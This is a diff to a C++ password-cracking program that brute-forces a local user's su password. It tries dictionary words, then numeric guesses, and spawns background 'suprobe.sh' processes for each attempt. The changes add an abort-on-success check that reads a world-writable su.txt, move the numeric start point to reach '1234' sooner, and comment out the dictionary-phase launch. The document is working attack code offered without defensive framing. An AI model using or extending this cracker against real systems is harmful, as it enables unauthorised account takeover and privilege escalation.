@@ -11,6 +11,7 @@
 #include <stdexcept>
 #include <string>
 #include <array>
+#include <csignal>
 
 using namespace std;
 
@@ -66,7 +67,18 @@ string int_to_string(string s, long long n) {
     }
 }
 
+bool found(){
+	return (stoi(exec("cat su.txt | wc -l")) > 0);
+}
+
+void passwordFound(int sig){
+	cout << "Password found. Aborting search" << endl;
+	exit(sig);
+}
+
+
 int main(int argc, char **argv){
+    signal(SIGINT, passwordFound);
     pwds.push_back(""); //Just in case user has no password
     cout << getpid() << endl;
 
@@ -144,20 +156,21 @@ int main(int argc, char **argv){
     //PASSWORD CRACKING MODE:
     system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
     for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
-        while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
+        if(i%10==0 && found()) passwordFound(0); //If found, abort
+	while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
             //cout << mem_left() << endl;
             usleep (1000000); //Avoid fork bombing yourself
         }
         const string cmd = "bash suprobe.sh " + pwds[i] +' '+ USERNAME + ' ' + to_string(getpid()) + " >/dev/null 2>/dev/null &";
-        system(cmd.c_str());
+        //system(cmd.c_str());
     }
     //If we make it this far, password was not in dict;
-    for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
+    for(long long i = 964900; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
         //Test Password
         pwd=int_to_string("", i);
         const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ">/dev/null 2>/dev/null &";
         system(cmd.c_str());
-        if(i%10==0) cout << pwd << endl;
+        if(i%10==0 && found()) passwordFound(0); //If found, abort
         //Attempt to keep procs under PROC_CAP
         while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
             //cout << mem_left() << endl;
